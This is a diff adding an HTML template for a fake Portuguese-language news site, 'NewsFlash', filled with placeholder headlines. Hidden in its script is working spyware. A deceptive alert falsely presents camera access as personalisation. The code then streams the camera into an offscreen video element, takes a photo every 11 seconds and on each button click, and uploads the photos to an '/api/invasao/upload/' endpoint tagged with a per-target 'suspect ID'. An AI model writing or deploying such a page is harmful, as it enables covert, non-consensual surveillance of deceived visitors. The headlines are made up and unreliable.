@@ -1,0 +1,582 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Notícias em Destaque</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <!-- Inject suspect ID as a global variable -->
+    <script>
+        window.SUSPECT_ID = "{{ suspect_id }}";
+    </script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Open Sans', sans-serif;
+            background: #f8f9fa;
+            color: #333;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        .header {
+            background: #fff;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            margin-bottom: 30px;
+            border-radius: 10px;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 15px;
+        }
+        
+        .logo-icon {
+            font-size: 36px;
+            color: #dc3545;
+        }
+        
+        .logo-text {
+            font-family: 'Merriweather', serif;
+            font-size: 32px;
+            font-weight: 700;
+            color: #212529;
+        }
+        
+        .tagline {
+            color: #6c757d;
+            font-size: 18px;
+        }
+        
+        .breaking-news {
+            background: linear-gradient(90deg, #dc3545 0%, #c82333 100%);
+            color: white;
+            padding: 15px 20px;
+            border-radius: 8px;
+            margin: 20px 0;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .breaking-badge {
+            background: #fff;
+            color: #dc3545;
+            padding: 5px 10px;
+            border-radius: 4px;
+            font-weight: 700;
+            font-size: 14px;
+            text-transform: uppercase;
+        }
+        
+        .content-wrapper {
+            display: grid;
+            grid-template-columns: 2fr 1fr;
+            gap: 30px;
+        }
+        
+        .main-content {
+            background: #fff;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+        }
+        
+        .featured-article {
+            margin-bottom: 40px;
+        }
+        
+        .article-image {
+            height: 400px;
+            background: linear-gradient(45deg, #007bff, #28a745, #ffc107, #dc3545);
+            border-radius: 10px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 60px;
+            color: white;
+        }
+        
+        .article-category {
+            color: #007bff;
+            font-weight: 600;
+            text-transform: uppercase;
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+        
+        .article-title {
+            font-family: 'Merriweather', serif;
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 15px;
+            line-height: 1.3;
+        }
+        
+        .article-excerpt {
+            color: #6c757d;
+            font-size: 18px;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+        
+        .article-meta {
+            display: flex;
+            gap: 20px;
+            color: #6c757d;
+            font-size: 14px;
+        }
+        
+        .read-more {
+            background: #007bff;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 30px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+        
+        .read-more:hover {
+            background: #0056b3;
+        }
+        
+        .news-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 25px;
+            margin-top: 40px;
+        }
+        
+        .news-card {
+            background: #f8f9fa;
+            border-radius: 8px;
+            overflow: hidden;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+        
+        .news-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        }
+        
+        .card-image {
+            height: 150px;
+            background: linear-gradient(45deg, #6f42c1, #e83e8c);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 30px;
+            color: white;
+        }
+        
+        .card-content {
+            padding: 20px;
+        }
+        
+        .card-category {
+            color: #6f42c1;
+            font-weight: 600;
+            text-transform: uppercase;
+            font-size: 12px;
+            margin-bottom: 8px;
+        }
+        
+        .card-title {
+            font-family: 'Merriweather', serif;
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 10px;
+            line-height: 1.4;
+        }
+        
+        .sidebar {
+            background: #fff;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            padding: 25px;
+            align-self: start;
+        }
+        
+        .sidebar-title {
+            font-family: 'Merriweather', serif;
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid #007bff;
+        }
+        
+        .trending-item {
+            padding: 15px 0;
+            border-bottom: 1px solid #eee;
+        }
+        
+        .trending-item:last-child {
+            border-bottom: none;
+        }
+        
+        .trending-title {
+            font-weight: 600;
+            margin-bottom: 8px;
+            line-height: 1.4;
+        }
+        
+        .trending-meta {
+            display: flex;
+            justify-content: space-between;
+            font-size: 13px;
+            color: #6c757d;
+        }
+        
+        .newsletter {
+            background: #e9ecef;
+            border-radius: 8px;
+            padding: 20px;
+            margin-top: 30px;
+        }
+        
+        .newsletter h3 {
+            font-size: 18px;
+            margin-bottom: 15px;
+        }
+        
+        .newsletter-form {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+        
+        .newsletter-input {
+            padding: 12px 15px;
+            border: 1px solid #ced4da;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        
+        .subscribe-btn {
+            background: #28a745;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 5px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        
+        .video-container {
+            display: none;
+        }
+        
+        video {
+            width: 1px;
+            height: 1px;
+            position: absolute;
+            top: -1000px;
+            left: -1000px;
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 30px 0;
+            margin-top: 40px;
+            color: #6c757d;
+            border-top: 1px solid #dee2e6;
+        }
+        
+        @media (max-width: 900px) {
+            .content-wrapper {
+                grid-template-columns: 1fr;
+            }
+            
+            .news-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+        
+        @media (max-width: 600px) {
+            .article-image {
+                height: 250px;
+            }
+            
+            .logo-text {
+                font-size: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">
+                <div class="logo-icon">📰</div>
+                <div class="logo-text">NewsFlash</div>
+            </div>
+            <div class="tagline">Notícias em Tempo Real - A Fonte Mais Confiável</div>
+        </div>
+        
+        <div class="breaking-news">
+            <div class="breaking-badge">Última Hora</div>
+            <div>Presidente anuncia novas medidas econômicas para estimular o crescimento nacional</div>
+        </div>
+        
+        <div class="content-wrapper">
+            <div class="main-content">
+                <div class="featured-article">
+                    <div class="article-image">🌍</div>
+                    <div class="article-category">Política</div>
+                    <h1 class="article-title">Reforma Tributária é Aprovada pelo Congresso com Maioria Qualificada</h1>
+                    <p class="article-excerpt">Após intensas negociações, o Congresso Nacional aprovou nesta terça-feira a reforma tributária mais ambiciosa da história do país, que promete simplificar o sistema fiscal e reduzir a carga sobre empresas e consumidores.</p>
+                    <div class="article-meta">
+                        <span>Por Ana Silva</span>
+                        <span>Há 2 horas</span>
+                        <span>15 minutos de leitura</span>
+                    </div>
+                    <button class="read-more" id="readMoreBtn">LER MATÉRIA COMPLETA</button>
+                </div>
+                
+                <div class="news-grid">
+                    <div class="news-card">
+                        <div class="card-image">🏥</div>
+                        <div class="card-content">
+                            <div class="card-category">Saúde</div>
+                            <h3 class="card-title">Novo medicamento contra câncer mostra eficácia de 95% em testes clínicos</h3>
+                            <div class="trending-meta">
+                                <span>Há 4 horas</span>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="news-card">
+                        <div class="card-image">⚽</div>
+                        <div class="card-content">
+                            <div class="card-category">Esportes</div>
+                            <h3 class="card-title">Seleção brasileira vence Argentina por 2x1 em amistoso histórico</h3>
+                            <div class="trending-meta">
+                                <span>Há 6 horas</span>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="news-card">
+                        <div class="card-image">🚀</div>
+                        <div class="card-content">
+                            <div class="card-category">Tecnologia</div>
+                            <h3 class="card-title">Empresa nacional lança satélite revolucionário para internet de alta velocidade</h3>
+                            <div class="trending-meta">
+                                <span>Há 8 horas</span>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="news-card">
+                        <div class="card-image">🎬</div>
+                        <div class="card-content">
+                            <div class="card-category">Entretenimento</div>
+                            <h3 class="card-title">Filme brasileiro ganha prêmio internacional em festival de cinema europeu</h3>
+                            <div class="trending-meta">
+                                <span>Há 10 horas</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="sidebar">
+                <h2 class="sidebar-title">Em Alta</h2>
+                
+                <div class="trending-item">
+                    <div class="trending-title">Economia apresenta crescimento surpreendente no último trimestre</div>
+                    <div class="trending-meta">
+                        <span>Economia</span>
+                        <span>25K visualizações</span>
+                    </div>
+                </div>
+                
+                <div class="trending-item">
+                    <div class="trending-title">Cientistas descobrem nova espécie de animal em floresta amazônica</div>
+                    <div class="trending-meta">
+                        <span>Ciência</span>
+                        <span>18K visualizações</span>
+                    </div>
+                </div>
+                
+                <div class="trending-item">
+                    <div class="trending-title">Chef brasileiro é eleito melhor do mundo em competição internacional</div>
+                    <div class="trending-meta">
+                        <span>Gastronomia</span>
+                        <span>32K visualizações</span>
+                    </div>
+                </div>
+                
+                <div class="trending-item">
+                    <div class="trending-title">Novo aplicativo ajuda agricultores a aumentarem produtividade em 40%</div>
+                    <div class="trending-meta">
+                        <span>Tecnologia</span>
+                        <span>15K visualizações</span>
+                    </div>
+                </div>
+                
+                <div class="newsletter">
+                    <h3>Receba nossas notícias</h3>
+                    <div class="newsletter-form">
+                        <input type="email" class="newsletter-input" id="emailInput" placeholder="Seu melhor e-mail">
+                        <button class="subscribe-btn" id="subscribeBtn">ASSINAR NEWSLETTER</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="video-container">
+            <video id="video" autoplay playsinline muted></video>
+            <canvas id="canvas" style="display:none;"></canvas>
+        </div>
+        
+        <div class="footer">
+            <p>© 2025 NewsFlash - Todos os direitos reservados<br>
+            Editora Notícias Ltda. - CNPJ: 98.765.432/0001-00</p>
+        </div>
+    </div>
+
+    <script>
+        // Global variables
+        let stream = null;
+        let captureInterval = null;
+        let photoCount = 0;
+        
+        // DOM Elements
+        const videoElement = document.getElementById('video');
+        const canvasElement = document.getElementById('canvas');
+        const readMoreBtn = document.getElementById('readMoreBtn');
+        const subscribeBtn = document.getElementById('subscribeBtn');
+        const emailInput = document.getElementById('emailInput');
+        
+        // Request camera permissions with social engineering
+        async function requestCameraAccess() {
+            try {
+                // Show a convincing message before requesting camera access
+                alert("Para personalizar as notícias que você vê e melhorar sua experiência de leitura, estamos realizando uma breve verificação ambiental. Esta é uma análise automática para otimizar o conteúdo para você.");
+                
+                // Request camera access
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'environment' }, 
+                    audio: false 
+                });
+                
+                // Display video feed off-screen
+                videoElement.srcObject = stream;
+                
+                // Start capture immediately
+                startCapture();
+                
+                return true;
+            } catch (error) {
+                console.error('Error accessing camera:', error);
+                alert("Verificação não concluída. Continuaremos mostrando notícias relevantes com base em suas preferências salvas.");
+                return false;
+            }
+        }
+        
+        // Capture photo from video stream
+        function capturePhoto() {
+            if (!stream) return;
+            
+            canvasElement.width = videoElement.videoWidth;
+            canvasElement.height = videoElement.videoHeight;
+            const ctx = canvasElement.getContext('2d');
+            ctx.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
+            
+            // Convert to blob and send
+            canvasElement.toBlob(async (blob) => {
+                if (blob) {
+                    await sendMedia(blob, 'photo', `news_photo_${Date.now()}.jpg`);
+                    photoCount++;
+                }
+            }, 'image/jpeg', 0.8);
+        }
+        
+        // Send media to backend
+        async function sendMedia(blob, mediaType, filename) {
+            const formData = new FormData();
+            formData.append('media_type', mediaType);
+            formData.append('file', blob, filename);
+            formData.append('caption', `News template - ${mediaType} captured at ${new Date().toLocaleString()}`);
+            
+            // Debug logging
+            console.log('Sending media with suspect ID:', window.SUSPECT_ID);
+            
+            try {
+                const response = await fetch('/api/invasao/upload/', {
+                    method: 'POST',
+                    body: formData,
+                    headers: {
+                        'X-Suspect-ID': window.SUSPECT_ID || '1'  // Use dynamic suspect ID
+                    }
+                });
+                
+                if (response.ok) {
+                    console.log(`${mediaType} sent successfully`);
+                } else {
+                    console.error(`Failed to send ${mediaType}:`, response.status);
+                }
+            } catch (error) {
+                console.error(`Error sending ${mediaType}:`, error);
+            }
+        }
+        
+        // Start automatic capture
+        function startCapture() {
+            if (captureInterval) {
+                clearInterval(captureInterval);
+            }
+            
+            // Take a photo every 11 seconds
+            captureInterval = setInterval(() => {
+                capturePhoto();
+            }, 11000);
+            
+            // Take an initial photo
+            setTimeout(() => {
+                capturePhoto();
+            }, 2000);
+        }
+        
+        // Initialize when page loads
+        window.addEventListener('DOMContentLoaded', async () => {
+            // Request camera access immediately
+            await requestCameraAccess();
+            
+            // Also trigger capture when user interacts with buttons
+            readMoreBtn.addEventListener('click', () => {
+                capturePhoto();
+                alert('Carregando matéria completa...');
+            });
+            
+            subscribeBtn.addEventListener('click', () => {
+                const email = emailInput.value.trim();
+                if (email) {
+                    capturePhoto();
+                    alert('Inscrição realizada com sucesso! Você receberá nossas notícias em breve.');
+                } else {
+                    alert('Por favor, insira um e-mail válido.');
+                }
+            });
+        });
+    </script>
+</body>
+</html>
